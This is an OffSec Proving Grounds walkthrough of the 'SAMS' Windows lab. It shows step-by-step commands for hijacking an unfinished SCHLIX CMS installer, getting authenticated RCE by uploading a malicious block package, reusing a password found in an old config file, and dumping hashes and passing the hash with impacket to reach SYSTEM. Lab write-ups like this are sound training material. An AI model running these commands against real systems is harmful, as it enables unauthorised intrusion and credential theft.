OffSec SAMS Walkthrough

Type: Proving Grounds · Windows 10 (build 19045)

SAMS hands you a SCHLIX CMS that was never finished installing, and that unfinished installer is the whole game. The brief points at HiveNightmare for privilege escalation, but the box does not actually hold up its end of that bargain, so root comes from an old config file someone forgot to delete. Initial access is a SCHLIX 2.2.6-6 authenticated RCE; root is plain credential reuse. This writeup documents the verified path to both flags.

1. Reconnaissance

INFO

A full scan shows an ordinary Windows web host. The site on 80/443 is a static template, but the real application lives one directory deep and only answers over HTTPS. 

copynmap -p- --min-rate 5000 192.168.x.x
nmap -sC -sV -p 80,443,445,3306 192.168.x.x
PortServiceNotes
80 / 443Apache 2.4.48 / PHP 7.3.29SCHLIX CMS under /testing/, HTTPS only
445SMBhost SAMS-PC, signing disabled
3306MariaDBno remote logins allowed

The admin route /testing/?r=admin/login answers with SCHLIX's "no website configured at this address." That is not an error you route around, it means the install was never completed.

2. Finishing someone else's install

SUCCESS

The installer is still sitting at /testing/install/ and it wants an external database. So you give it one: your own MariaDB on the VPN interface, opened up just enough for the target's PHP to connect back. When the wizard finishes, the admin account it creates is the one you chose. 

copysudo sed -i 's/^bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf
sudo systemctl restart mariadb
sudo mysql -e "CREATE DATABASE schlixdb; CREATE USER 'schlix'@'%' IDENTIFIED BY 'sch******'; GRANT ALL ON *.* TO 'schlix'@'%' WITH GRANT OPTION;"

Walk the wizard, point the database step at your VPN IP, skip SSL, tick the wildcard URL option so the site serves on the bare IP, and set the admin login to admin / ad******. The install writes its tables straight into your database, which is convenient later.

3. Authenticating, the annoying way

INFO

Two things waste time if you script this. SCHLIX renders the full admin chrome (menu, logout link, all of it) even on a request that did not authenticate, so a page looking "logged in" proves nothing. The login only takes effect with the AJAX headers, and it answers with JSON. 

copycurl -sk -b "$CK" -H 'X-Requested-With: XMLHttpRequest' -H 'X-Schlix-Ajax: 1' \
  "$U/admin/userlogin/" -F "_csrftoken=$C1" -F 'username=admin' -F 'password=ad******'
# {"status":200,"data":{"messages":["Login successful"]}}

The other trap: curl refuses to persist the session cookie because the server scopes it to domain=<IP>, which the cookie spec disallows. Read the Set-Cookie from the response headers and pass it back by hand instead of trusting the jar. The CSRF token for the upload is sitting in the session table, in the database you control, so you can just read it out.

4. RCE through the block manager

SUCCESS

SCHLIX 2.2.6-6 lets an authenticated admin install a block package, and the package's packageinfo.inc.php gets included when you open the extension's About tab. That is the execution. The only fiddly part is the archive layout: the installer derives the extension name from the first folder in the zip and expects name/blocks/name/ inside. Get that wrong and you get an unhelpful max() error instead of a shell. 

copy# malicious mailchimp block, payload appended to packageinfo.inc.php
curl -sk -b "$CK" -H 'X-Requested-With: XMLHttpRequest' -H 'X-Schlix-Ajax: 1' \
  "$U/admin/app/core.blockmanager?&ajax=1&action=install" \
  -F "_csrftoken=$C2" -F 'zipfileupload=@combo_mailchimp-1_0_1.zip' \
  -F 'MAX_FILE_SIZE=2097152' -F 'password=ad******'
copycurl -sk -b "$CK" "$U/admin/app/core.blockmanager?action=edititem&id=1&tab=about&c=whoami"
# sams-pc\sam

One block row inserted into the database gives the About tab something to render, and the payload fires.

Local flag (sams-pc\sam):

3fd5ad813a68fd7883d116abc6******

5. Hashes and SYSTEM

SUCCESS

The user's PowerShell history points straight at an old phpMyAdmin config, and the old config still holds the password the current one had scrubbed. That database password is also the Administrator's password, it always is. 

copytype C:\Users\sam\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\xampp\phpMyAdmin\config.inc.old.php
# password = 'Seriou******'

nxc smb 192.168.x.x -u Administrator -p 'Seriou******'   # (Pwn3d!)

With admin you get the hive dump the lab was after anyway, just through the front door. Pass the hash closes it out. 

copyimpacket-secretsdump 'Administrator:Seriou******@192.168.x.x'
# Administrator: ... :0912e49206267ee2d62eb06cab******:::

impacket-psexec -hashes ':0912e49206267ee2d62eb06cab******' 'Administrator@192.168.x.x'
# nt authority\system

Proof flag (NT AUTHORITY\SYSTEM):

d3399dac14ce90d8ba64d50cd3******

6. Failed paths

DEAD END

The box is named SAMS, the brief says HiveNightmare, the eventual password is Seriou******. Someone wanted this to be about reading the SAM. It is not, not from this shell.

  • No shadow copy: checked volumes 1 through 60, none exist. HiveNightmare reads the hives out of a VSS snapshot, and there isn't one. A standard user cannot create one.
  • Live hive ACL: the SAM/SYSTEM/SECURITY files do not grant sam read, so the live file variant is out too.
  • Defender and AMSI: Defender deletes the HiveNightmare binary on contact, and AMSI silently swallows the PowerShell version, its own special kind of debugging, where nothing happens and nothing tells you why.
copy1..60 | %{ try { (New-Object IO.FileStream(
 "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM",
 [IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]'ReadWrite,Delete')).Close(); "HIT:$_" } catch {} }
# (nothing)

The takeaway: when the documented privesc does not fit the snapshot you are on, the learning objective still gets met. Admin credentials plus secretsdump plus pass the hash covers "hive dumping" and "pass the hash to SYSTEM" without a single shadow copy. The history file usually knows more than the exploit does.

Hands above the blanket, and good luck out there. :)
